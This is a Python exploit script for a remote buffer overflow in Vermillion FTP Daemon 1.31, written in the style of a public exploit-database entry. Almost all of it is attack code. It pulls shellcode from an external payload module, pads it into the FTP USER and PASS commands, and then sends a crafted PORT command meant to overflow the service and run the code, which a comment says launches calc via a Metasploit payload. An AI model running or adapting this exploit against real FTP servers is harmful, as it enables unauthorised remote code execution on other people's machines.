# Exploit Title: Vermillion FTP Deamon Remote BOF Exploit
# Date: 29/01/2010
# Author: Dz_attacker
# Software Link: http://www.softsea.com/download/Vermillion-FTP-Daemon.html
# Version: 1.31
# Tested on: Windows xp sp3
# Code :

#!/usr/bin/python

#[+] Original : http://www.global-evolution.info/news/files/vftpd/vftpd.txt

import socket
import sys
import time


from payload import buf

import struct
def shell_attack(target_machine, target_port): 
    # win32_exec - EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
    stage = b"92060006,92080001,92120010,92150015,92000015,92040002,"
    stage += b"92050002,92060010,92000002,92050008,92120013,92020014,"
    stage += b"92030012,92000005,92050010,92070004,92140015,92110008,"
    stage += b"92040004,92050010,92030002,92030007,92080011,92150010,"
    stage += b"92100015,92070005,92140010,92100015,92070005,92140007,"
    stage += b"92150015,92140007,"

    payload = buf + b"\x44"*(500-len(buf))

    buffer = b"92040001,"*11
    buffer += stage
    buffer += b"92020004,"
    buffer += b"92150011,"
    buffer += b"92010002,"
    buffer += b"92000000,"
    buffer += b"92020013,"
    buffer += b"92070000,"
    buffer += b"92040002,"
    buffer += b"92000000,"
    buffer += b"2"
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_machine,target_port))
   
    s.recv(1024)
    s.send(b'USER '+payload+b'\r\n')
    s.recv(1024)
    s.send(b'PASS '+payload+b'\r\n')
    s.recv(1024)
    s.send(b'SYST\r\n')
    s.recv(1024)
    s.send(b'QUIT\r\n')
    s.recv(1024)
    s.close()

    time.sleep(2)
    
    s2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2.connect((target_machine,target_port))
    
    s2.send(b'PORT '+buffer+b'\r\n')
    s2.close()
    time.sleep(2)
    
    time.sleep(3)
   

